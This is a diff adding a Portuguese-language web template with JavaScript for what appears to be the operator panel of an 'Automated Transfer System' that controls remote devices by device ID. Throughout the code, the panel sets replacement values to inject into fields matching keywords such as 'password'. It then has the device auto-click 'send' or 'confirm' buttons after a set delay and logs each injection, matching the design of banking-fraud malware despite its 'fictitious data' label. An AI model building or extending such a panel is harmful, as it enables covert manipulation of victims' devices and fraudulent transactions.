@@ -1,0 +1,504 @@
+<div class="ui container segment">
+    <h3 class="ui header">ATS - Automated Transfer System</h3>
+    <p>Sistema automático de transferência de dados. Substitui dados legítimos por dados fictícios em campos específicos.</p>
+
+    <div class="ui segment">
+        <h4>Estado do ATS</h4>
+        <div class="field">
+            <div class="ui toggle checkbox" id="atsToggle">
+                <input type="checkbox" id="atsEnabled">
+                <label>ATS <span id="atsStatus">Desabilitado</span></label>
+            </div>
+        </div>
+    </div>
+
+    <div class="ui divider"></div>
+
+    <div class="ui grid">
+        <div class="eight wide column">
+            <div class="ui segment">
+                <h4>Dados Fictícios</h4>
+                <p>Configure os dados que serão injetados automaticamente.</p>
+                
+                <div id="dataMappingList" style="max-height: 300px; overflow-y: auto; border: 1px solid #ddd; border-radius: 4px; padding: 10px; margin-bottom: 15px;">
+                    <p style="color: #999;">Carregando dados...</p>
+                </div>
+
+                <form class="ui form" id="dataMappingForm">
+                    <div class="two fields">
+                        <div class="field">
+                            <label>Nome do Campo</label>
+                            <input type="text" name="field" placeholder="ex: email" required>
+                        </div>
+                        <div class="field">
+                            <label>Valor Fictício</label>
+                            <input type="text" name="value" placeholder="ex: usuario@example.com" required>
+                        </div>
+                    </div>
+                    <button class="ui primary button" type="button" onclick="addDataMapping()">Adicionar</button>
+                </form>
+            </div>
+        </div>
+
+        <div class="eight wide column">
+            <div class="ui segment">
+                <h4>Padrões de Campos</h4>
+                <p>Palavras-chave que disparam a injeção automática.</p>
+                
+                <div id="patternsList" style="max-height: 300px; overflow-y: auto; border: 1px solid #ddd; border-radius: 4px; padding: 10px; margin-bottom: 15px;">
+                    <p style="color: #999;">Carregando padrões...</p>
+                </div>
+
+                <form class="ui form" id="patternForm">
+                    <div class="field">
+                        <label>Novo Padrão</label>
+                        <input type="text" name="pattern" placeholder="ex: password" required>
+                    </div>
+                    <button class="ui primary button" type="button" onclick="addPattern()">Adicionar Padrão</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <div class="ui divider"></div>
+
+    <div class="ui segment">
+        <h4>Clique Automático de Confirmação</h4>
+        <p>Detecta e clica automaticamente no botão de envio/confirmação após preenchimento dos dados.</p>
+        
+        <div class="field">
+            <div class="ui toggle checkbox" id="autoClickToggle">
+                <input type="checkbox" id="autoClickEnabled">
+                <label>Auto-click <span id="autoClickStatus">Desabilitado</span></label>
+            </div>
+        </div>
+
+        <div class="ui form" style="margin-top: 15px;">
+            <div class="field">
+                <label>Delay antes do Clique (ms)</label>
+                <input type="number" id="clickDelayMs" min="0" max="5000" step="100" value="500" placeholder="500">
+                <small>Tempo em milissegundos entre injetar dados e clicar no botão</small>
+                <button class="ui mini button" type="button" onclick="updateClickDelay()" style="margin-top: 8px;">Atualizar</button>
+            </div>
+        </div>
+
+        <div style="margin-top: 20px;">
+            <h5>Padrões de Botão</h5>
+            <p>Palavras-chave que identificam botões de confirmação/envio:</p>
+            
+            <div id="buttonPatternsList" style="max-height: 200px; overflow-y: auto; border: 1px solid #ddd; border-radius: 4px; padding: 10px; margin-bottom: 15px;">
+                <p style="color: #999;">Carregando padrões...</p>
+            </div>
+
+            <form class="ui form" id="buttonPatternForm">
+                <div class="field">
+                    <label>Novo Padrão de Botão</label>
+                    <input type="text" name="pattern" placeholder="ex: enviar, confirmar, submit" required>
+                </div>
+                <button class="ui primary button" type="button" onclick="addButtonPattern()">Adicionar Padrão</button>
+            </form>
+        </div>
+
+        <div style="margin-top: 20px; padding: 10px; background-color: #fff8e1; border-left: 4px solid #ffc107; border-radius: 4px;">
+            <strong>💡 Dica:</strong> Clique em "Testar Agora" para verificar se o sistema consegue detectar e clicar no botão correto.
+            <button class="ui mini primary button" onclick="testAutoClick()" style="float: right;">Testar Agora</button>
+            <div style="clear: both;"></div>
+        </div>
+    </div>
+
+    <div class="ui divider"></div>
+        <button class="ui negative button" onclick="clearATSLog()" style="margin-bottom: 10px;">Limpar Log</button>
+        
+        <div id="atsLogList" style="max-height: 400px; overflow-y: auto; border: 1px solid #ddd; border-radius: 4px;">
+            <table class="ui celled table" style="margin-bottom: 0;">
+                <thead>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Operação</th>
+                        <th>Campo</th>
+                        <th>Status</th>
+                    </tr>
+                </thead>
+                <tbody id="atsLogBody">
+                    <tr><td colspan="4" style="text-align: center; color: #999;">Carregando log...</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <div class="ui divider"></div>
+
+    <div class="ui segment">
+        <h4>Como Funciona</h4>
+        <ul>
+            <li><strong>Habilitar ATS:</strong> Use o toggle acima para ativar o sistema</li>
+            <li><strong>Dados Fictícios:</strong> Adicione pares campo/valor que serão injetados</li>
+            <li><strong>Padrões:</strong> Defina palavras-chave que disparam a injeção automática</li>
+            <li><strong>Funcionamento:</strong> Quando um campo com texto matching um padrão é detectado, o dado fictício é injetado automaticamente</li>
+            <li><strong>Log:</strong> Todas as operações são registradas para auditoria</li>
+        </ul>
+    </div>
+</div>
+
+<script>
+let deviceID = '<%= deviceID %>';
+
+function loadATSConfig() {
+    fetch(`<%= baseURL %>/ats`)
+        .then(response => response.json())
+        .then(data => {
+            if (!data.error && data.enabled !== undefined) {
+                document.getElementById('atsEnabled').checked = data.enabled;
+                updateATSStatus(data.enabled);
+                updateDataMappingList(data.dataMapping);
+                updatePatternsList(data.fieldPatterns);
+                
+                // Auto-click config
+                if (data.autoClickEnabled !== undefined) {
+                    document.getElementById('autoClickEnabled').checked = data.autoClickEnabled;
+                    updateAutoClickStatus(data.autoClickEnabled);
+                }
+                if (data.clickDelayMs !== undefined) {
+                    document.getElementById('clickDelayMs').value = data.clickDelayMs;
+                }
+                if (data.buttonPatterns !== undefined) {
+                    updateButtonPatternsList(data.buttonPatterns);
+                }
+                
+                loadATSLog();
+            }
+        })
+        .catch(error => console.error('Erro ao carregar ATS:', error));
+}
+
+function updateATSStatus(enabled) {
+    let statusEl = document.getElementById('atsStatus');
+    statusEl.textContent = enabled ? '✓ Habilitado' : '✗ Desabilitado';
+    statusEl.style.color = enabled ? '#21ba45' : '#db2828';
+}
+
+function updateAutoClickStatus(enabled) {
+    let statusEl = document.getElementById('autoClickStatus');
+    statusEl.textContent = enabled ? '✓ Habilitado' : '✗ Desabilitado';
+    statusEl.style.color = enabled ? '#21ba45' : '#db2828';
+}
+
+function updateDataMappingList(dataMapping) {
+    let html = '<table class="ui celled table" style="margin-bottom: 0;">';
+    html += '<thead><tr><th>Campo</th><th>Valor Fictício</th><th>Ação</th></tr></thead><tbody>';
+    
+    for (let [key, value] of Object.entries(dataMapping)) {
+        html += `<tr>
+            <td><code>${key}</code></td>
+            <td>${value}</td>
+            <td><button class="ui mini red button" onclick="removeDataMapping('${key}')">Remover</button></td>
+        </tr>`;
+    }
+    
+    html += '</tbody></table>';
+    document.getElementById('dataMappingList').innerHTML = html;
+}
+
+function updatePatternsList(patterns) {
+    let html = '<div style="display: flex; flex-wrap: wrap; gap: 5px;">';
+    
+    patterns.forEach(pattern => {
+        html += `<div class="ui label">
+            ${pattern}
+            <i class="delete icon" onclick="removePattern('${pattern}')" style="cursor: pointer;"></i>
+        </div>`;
+    });
+    
+    html += '</div>';
+    document.getElementById('patternsList').innerHTML = html || '<p style="color: #999;">Nenhum padrão configurado</p>';
+}
+
+function loadATSLog() {
+    fetch(`<%= baseURL %>/ats/log`)
+        .then(response => response.json())
+        .then(data => {
+            let tbody = document.getElementById('atsLogBody');
+            
+            if (Array.isArray(data) && data.length > 0) {
+                let html = '';
+                data.forEach(entry => {
+                    let date = new Date(entry.timestamp).toLocaleString('pt-BR');
+                    let statusColor = entry.status === 'success' ? '#21ba45' : '#db2828';
+                    html += `<tr>
+                        <td>${date}</td>
+                        <td>${entry.operation}</td>
+                        <td><code>${entry.fieldName}</code></td>
+                        <td><span style="color: ${statusColor};">${entry.status}</span></td>
+                    </tr>`;
+                });
+                tbody.innerHTML = html;
+            } else {
+                tbody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: #999;">Sem registros</td></tr>';
+            }
+        })
+        .catch(error => console.error('Erro ao carregar log:', error));
+}
+
+document.getElementById('atsEnabled').addEventListener('change', function() {
+    let enabled = this.checked;
+    fetch(`<%= baseURL %>/ats/enable/${enabled}`, { method: 'POST' })
+        .then(response => response.json())
+        .then(data => {
+            if (!data.error) {
+                updateATSStatus(enabled);
+            } else {
+                alert('Erro: ' + data.error);
+                this.checked = !enabled;
+            }
+        })
+        .catch(error => console.error('Erro ao alternar ATS:', error));
+});
+
+document.getElementById('autoClickEnabled').addEventListener('change', function() {
+    let enabled = this.checked;
+    fetch(`<%= baseURL %>/ats/autoclick/enable/${enabled}`, { method: 'POST' })
+        .then(response => response.json())
+        .then(data => {
+            if (!data.error) {
+                updateAutoClickStatus(enabled);
+            } else {
+                alert('Erro: ' + data.error);
+                this.checked = !enabled;
+            }
+        })
+        .catch(error => console.error('Erro ao alternar Auto-click:', error));
+});
+
+function addDataMapping() {
+    let form = document.getElementById('dataMappingForm');
+    let field = form.elements['field'].value.trim();
+    let value = form.elements['value'].value.trim();
+    
+    if (!field || !value) {
+        alert('Preencha todos os campos');
+        return;
+    }
+    
+    let params = new URLSearchParams();
+    params.append('field', field);
+    params.append('value', value);
+    
+    fetch(`<%= baseURL %>/ats/data`, {
+        method: 'POST',
+        body: params
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (!data.error) {
+            form.reset();
+            loadATSConfig();
+        } else {
+            alert('Erro: ' + data.error);
+        }
+    })
+    .catch(error => console.error('Erro:', error));
+}
+
+function removeDataMapping(field) {
+    if (confirm(`Remover campo "${field}"?`)) {
+        fetch(`<%= baseURL %>/ats/data/${encodeURIComponent(field)}`, { method: 'DELETE' })
+            .then(response => response.json())
+            .then(data => {
+                if (!data.error) {
+                    loadATSConfig();
+                } else {
+                    alert('Erro: ' + data.error);
+                }
+            })
+            .catch(error => console.error('Erro:', error));
+    }
+}
+
+function addPattern() {
+    let form = document.getElementById('patternForm');
+    let pattern = form.elements['pattern'].value.trim();
+    
+    if (!pattern) {
+        alert('Digite um padrão');
+        return;
+    }
+    
+    let params = new URLSearchParams();
+    params.append('pattern', pattern);
+    
+    fetch(`<%= baseURL %>/ats/pattern`, {
+        method: 'POST',
+        body: params
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (!data.error) {
+            form.reset();
+            loadATSConfig();
+        } else {
+            alert('Erro: ' + data.error);
+        }
+    })
+    .catch(error => console.error('Erro:', error));
+}
+
+function removePattern(pattern) {
+    if (confirm(`Remover padrão "${pattern}"?`)) {
+        fetch(`<%= baseURL %>/ats/pattern/${encodeURIComponent(pattern)}`, { method: 'DELETE' })
+            .then(response => response.json())
+            .then(data => {
+                if (!data.error) {
+                    loadATSConfig();
+                } else {
+                    alert('Erro: ' + data.error);
+                }
+            })
+            .catch(error => console.error('Erro:', error));
+    }
+}
+
+function clearATSLog() {
+    if (confirm('Tem certeza que deseja limpar todo o log de ATS?')) {
+        fetch(`<%= baseURL %>/ats/log`, { method: 'DELETE' })
+            .then(response => response.json())
+            .then(data => {
+                if (!data.error) {
+                    loadATSConfig();
+                } else {
+                    alert('Erro: ' + data.error);
+                }
+            })
+            .catch(error => console.error('Erro:', error));
+    }
+}
+
+function updateClickDelay() {
+    let delayMs = document.getElementById('clickDelayMs').value;
+    
+    if (isNaN(delayMs) || delayMs < 0) {
+        alert('Digite um valor válido');
+        return;
+    }
+    
+    fetch(`<%= baseURL %>/ats/autoclick/delay/${delayMs}`, { method: 'POST' })
+        .then(response => response.json())
+        .then(data => {
+            if (!data.error) {
+                alert('Delay atualizado com sucesso');
+            } else {
+                alert('Erro: ' + data.error);
+            }
+        })
+        .catch(error => console.error('Erro:', error));
+}
+
+function updateButtonPatternsList(buttonPatterns) {
+    let html = '<div style="display: flex; flex-wrap: wrap; gap: 5px;">';
+    
+    buttonPatterns.forEach(pattern => {
+        html += `<div class="ui label">
+            ${pattern}
+            <i class="delete icon" onclick="removeButtonPattern('${pattern}')" style="cursor: pointer;"></i>
+        </div>`;
+    });
+    
+    html += '</div>';
+    document.getElementById('buttonPatternsList').innerHTML = html || '<p style="color: #999;">Nenhum padrão de botão configurado</p>';
+}
+
+function addButtonPattern() {
+    let form = document.getElementById('buttonPatternForm');
+    let pattern = form.elements['pattern'].value.trim();
+    
+    if (!pattern) {
+        alert('Digite um padrão');
+        return;
+    }
+    
+    let params = new URLSearchParams();
+    params.append('pattern', pattern);
+    
+    fetch(`<%= baseURL %>/ats/buttonpattern`, {
+        method: 'POST',
+        body: params
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (!data.error) {
+            form.reset();
+            loadATSConfig();
+        } else {
+            alert('Erro: ' + data.error);
+        }
+    })
+    .catch(error => console.error('Erro:', error));
+}
+
+function removeButtonPattern(pattern) {
+    if (confirm(`Remover padrão "${pattern}"?`)) {
+        fetch(`<%= baseURL %>/ats/buttonpattern/${encodeURIComponent(pattern)}`, { method: 'DELETE' })
+            .then(response => response.json())
+            .then(data => {
+                if (!data.error) {
+                    loadATSConfig();
+                } else {
+                    alert('Erro: ' + data.error);
+                }
+            })
+            .catch(error => console.error('Erro:', error));
+    }
+}
+
+function testAutoClick() {
+    if (confirm('Enviar comando de teste de auto-click para o dispositivo?')) {
+        let delayMs = parseInt(document.getElementById('clickDelayMs').value) || 500;
+        
+        fetch(`<%= baseURL %>/command`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                type: '0xAC',
+                action: 'button_pattern_click',
+                clickDelayMs: delayMs
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (!data.error) {
+                alert('Comando de teste enviado. Aguarde resultado...');
+            } else {
+                alert('Erro: ' + data.error);
+            }
+        })
+        .catch(error => console.error('Erro:', error));
+    }
+}
+
+// Carrega config ao abrir página
+window.addEventListener('load', loadATSConfig);
+
+// Atualiza log a cada 5 segundos
+setInterval(loadATSLog, 5000);
+</script>
+
+<style>
+.ui.toggle.checkbox input:checked ~ label {
+    color: #333;
+}
+
+code {
+    background-color: #f5f5f5;
+    padding: 2px 6px;
+    border-radius: 3px;
+    font-size: 12px;
+}
+
+#dataMappingList, #patternsList, #atsLogList {
+    background-color: #fafafa;
+}
+
+.ui.label i.delete.icon:hover {
+    background-color: #f5f5f5;
+    border-radius: 3px;
+}
+</style>
